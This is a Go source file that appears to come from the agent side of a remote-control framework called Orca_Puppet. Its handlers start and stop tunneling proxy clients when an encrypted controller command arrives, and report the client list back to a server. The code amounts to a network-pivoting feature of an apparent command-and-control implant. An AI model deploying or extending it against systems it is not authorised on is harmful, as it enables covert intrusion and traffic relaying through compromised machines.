package controller

import (
	"Orca_Puppet/cli/cmdopt/proxyopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"fmt"
	"github.com/esrrhs/go-engine/src/loggo"
	"github.com/esrrhs/go-engine/src/proxy"
)

func proxyClientStartCmd(sendUserId, decData string) {
	loggo.Ini(loggo.Config{
		Level:     1,
		Prefix:    "orca",
		MaxDay:    3,
		NoLogFile: true,
		NoPrint:   !debug.IsDebug,
	})
	var proxyClientParam proxyopt.ProxyClientParam
	json.Unmarshal([]byte(decData), &proxyClientParam)
	uid := util.GenUUID()
	proxyName := new(string)
	serverAddr := new(string)
	*proxyName = uid
	*serverAddr = proxyClientParam.ServerAddr
	protos := []string{proxyClientParam.Proto}
	proxyProto := []string{proxyClientParam.ProxyProto}
	connType := proxyopt.ConnTypeMap[proxyClientParam.ConnType]

	Key := proxyClientParam.Key
	fromAddr := []string{proxyClientParam.FromAddr}
	toAddr := []string{proxyClientParam.ToAddr}
	defConfig := proxy.DefaultConfig()

	defConfig.Encrypt = config.AesKey
	defConfig.Key = Key
	client, err := proxy.NewClient(defConfig, protos[0], *serverAddr, *proxyName, connType, proxyProto, fromAddr, toAddr)
	if err != nil {
		retData := colorcode.OutputMessage(colorcode.SIGN_FAIL, fmt.Sprintf("main NewClient fail %s", err.Error()))
		common.SendFailMsg(sendUserId, common.ClientId, "proxyClientStart_ret", retData)
		return
	}
	var proxyClient = proxyopt.ProxyClient{
		Uid:              uid,
		Client:           client,
		ClientId:         common.ClientId,
		ProxyClientParam: proxyClientParam,
	}
	proxyopt.ProxyClientList = append(proxyopt.ProxyClientList, proxyClient)
	marshal, _ := json.Marshal(proxyopt.ProxyClientList)
	data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
	common.SendSuccessMsg("Server", common.ClientId, "proxyClientStart", data)
	retData := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "proxy client start!")
	common.SendSuccessMsg(sendUserId, common.ClientId, "proxyClientStart_ret", retData)
}

func proxyClientCloseCmd(decData string) {
	debug.DebugPrint("decData")
	var index int
	closeFlag := false
	for i, client := range proxyopt.ProxyClientList {
		if decData == client.Uid {
			client.Client.Close()
			index = i
			closeFlag = true
		}
	}
	if closeFlag {
		proxyopt.ProxyClientList = append(proxyopt.ProxyClientList[:index], proxyopt.ProxyClientList[index+1:]...)
	}
}
